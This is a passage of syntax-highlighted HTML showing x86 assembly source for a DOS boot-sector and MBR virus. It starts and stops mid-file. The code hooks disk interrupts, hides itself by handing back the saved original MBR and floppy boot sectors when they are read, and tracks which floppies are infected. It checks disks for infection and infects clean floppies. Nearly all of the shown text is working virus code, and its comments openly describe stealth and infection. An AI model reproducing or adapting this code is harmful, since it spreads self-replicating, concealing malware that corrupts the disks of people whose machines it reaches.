                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5803h</span><span class="sc0">                </span><span class="sc1">; set umb link state</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">                   </span><span class="sc1">; restore the old state</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">                </span><span class="sc1">; set mem alloc strategy</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; to old one</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                    </span><span class="sc1">; jmp far</span><span class="sc0">
</span><span class="sc5">jmp_far_off</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">02f6h</span><span class="sc0">                   </span><span class="sc1">; this contains actual</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">                   </span><span class="sc1">; call_res+21h block</span><span class="sc0">

</span><span class="sc5">forget_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; just do a disk reset</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rstatus_and_back</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">virus_disk_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; see if calling a function</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">pass_to_old</span><span class="sc0">             </span><span class="sc1">; we need to stealth such as</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; read, write, format</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">pass_to_old</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; check if on primary hd</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">pass_to_old</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">           </span><span class="sc1">; and cx,0ffc0h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">pass_to_old</span><span class="sc0">             </span><span class="sc1">; doing something on virus zone?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; if not mbr it could delete</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">forget_call</span><span class="sc0">             </span><span class="sc1">; the virus, so forget it</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; if reading stealth, else</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">forget_call</span><span class="sc0">             </span><span class="sc1">; forget it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                      </span><span class="sc1">; read the original mbr</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rstatus_and_back</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">entry_88h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">check_by</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; DL contains drive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">floppy_a</span><span class="sc0">                        </span><span class="sc1">; 0 then floppy A:</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">floppy_b</span><span class="sc0">                        </span><span class="sc1">; 1 then floppy B:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">virus_disk_handler</span><span class="sc0">        </span><span class="sc1">; else a hard disk</span><span class="sc0">
</span><span class="sc5">pass_to_old</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
</span><span class="sc5">rstatus_and_back</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">check_by</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; contains disk drive</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">floppy_a_ret</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">floppy_b_ret</span><span class="sc0">
</span><span class="sc5">return_13h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;   status words</span><span class="sc0">
</span><span class="sc1">; value_ax2 is for floppy B:, value_ax1 is for floppy A:, while value_ax0 is</span><span class="sc0">
</span><span class="sc1">; common temporary for both.</span><span class="sc0">
</span><span class="sc1">; the value of this status word is:</span><span class="sc0">
</span><span class="sc1">;   high byte:  00 - floppy is not infected</span><span class="sc0">
</span><span class="sc1">;               01 - floppy is infected</span><span class="sc0">
</span><span class="sc1">;   low  byte:  00 - floppy has not been checked yet</span><span class="sc0">
</span><span class="sc1">;               01 - floppy has been checked</span><span class="sc0">
</span><span class="sc1">; this way the virus won't be checking each time all the things and, when</span><span class="sc0">
</span><span class="sc1">; needed, will stealth faster. of course this status words are reset each</span><span class="sc0">
</span><span class="sc1">; time a disk change is deteced.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">floppy_b_ret</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">                            </span><span class="sc1">; mov ax,</span><span class="sc0">
</span><span class="sc5">value_ax0</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">101h</span><span class="sc0">                            </span><span class="sc1">; update floppy_b status</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; with the temp one</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">return_13h</span><span class="sc0">
</span><span class="sc5">floppy_a_ret</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; update floppy_a status</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; word with the temp one</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">return_13h</span><span class="sc0">
</span><span class="sc5">floppy_a</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">                    </span><span class="sc1">; mov ax, floppy_a status word</span><span class="sc0">
</span><span class="sc5">value_ax1</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">check_routine</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">reset_status</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; reset status</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">pass_to_old</span><span class="sc0">               </span><span class="sc1">; and go back</span><span class="sc0">
</span><span class="sc5">floppy_b</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">                    </span><span class="sc1">; mov ax, floppy_b status word</span><span class="sc0">
</span><span class="sc5">value_ax2</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">check_routine</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">                  </span><span class="sc1">; detect disk change</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">                     </span><span class="sc1">; int13h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">reset_status</span><span class="sc0">            </span><span class="sc1">; if disk changed, then reset</span><span class="sc0">
                                                </span><span class="sc1">; the status and continue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; interesting function?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">pass_to_old</span><span class="sc0">             </span><span class="sc1">; (2 read, 3 write)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">check_higher_fu</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                  </span><span class="sc1">; triing to read virus body</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">stop_extra</span><span class="sc0">              </span><span class="sc1">; on extra tracks?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; see if pointing to floppy</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit_fchecks</span><span class="sc0">            </span><span class="sc1">; boot sector</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit_fchecks</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">f_already_checked</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; writing to floppy boot? leave</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_fchecks</span><span class="sc0">            </span><span class="sc1">; them write then...</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_nfect</span><span class="sc0">             </span><span class="sc1">; check if infected</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ess_bel</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_floppy</span><span class="sc0">           </span><span class="sc1">; if not infect</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">ess_bel</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; mark as not infected</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ess_bel2</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">ess_bel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; this marks that an</span><span class="sc0">
                                                        </span><span class="sc1">; infected floppy is in</span><span class="sc0">
</span><span class="sc5">ess_bel2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; mark floppy as checked</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">f_already_checked</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; is/was floppy infected</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit_fchecks</span><span class="sc0">            </span><span class="sc1">; if not, don't stealth</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">read_fbs_stealth</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5101h</span><span class="sc0">                </span><span class="sc1">; if was writing then update</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; the changes to saved boot</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">                     </span><span class="sc1">; sector</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">work_exit</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">read_fbs_stealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">                     </span><span class="sc1">; execute requested read</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; but then read also the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5101h</span><span class="sc0">                </span><span class="sc1">; saved original boot sector</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">work_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rstatus_and_back</span><span class="sc0">
</span><span class="sc5">check_higher_fu</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                            </span><span class="sc1">; triing to format?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit_fchecks</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value_ax0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; if formatting reset</span><span class="sc0">
</span><span class="sc5">exit_fchecks</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">; status at all</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pass_to_old</span><span class="sc0">
</span><span class="sc5">stop_extra</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rstatus_and_back</span><span class="sc0">

</span><span class="sc5">check_nfect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seg_bx_tspace</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">do_read_mbr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; read MBR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">                     </span><span class="sc1">; orig int13h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">do_read_mbr</span><span class="sc0">             </span><span class="sc1">; twice so we are sure it's</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_exit</span><span class="sc0">                </span><span class="sc1">; there. exit on error</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; on hd? if not no pt check</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">check_name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1beh</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; on partition table</span><span class="sc0">

</span><span class="sc5">pt_search</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; on next partition entry</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; is bootable?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_ptentry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; os code</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; ok if dos w/12bit fat</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">check_name</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; ok for dos &lt; 32mb</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">bad_exit</span><span class="sc0">                </span><span class="sc1">; extended dos</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; and dos &gt; 32mb</span><span class="sc0">
                </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">bad_exit</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">check_name</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">next_ptentry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">pt_search</span><span class="sc0">

</span><span class="sc5">bad_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">; carry means error</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">check_name</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; where the name</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                           </span><span class="sc1">; should stay in boot</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">; see if already infected</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">bad_exit</span><span class="sc0">                </span><span class="sc1">; zero flag -&gt; it is</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">infect_mbr</span><span class="sc4">:</span><span class="sc0">
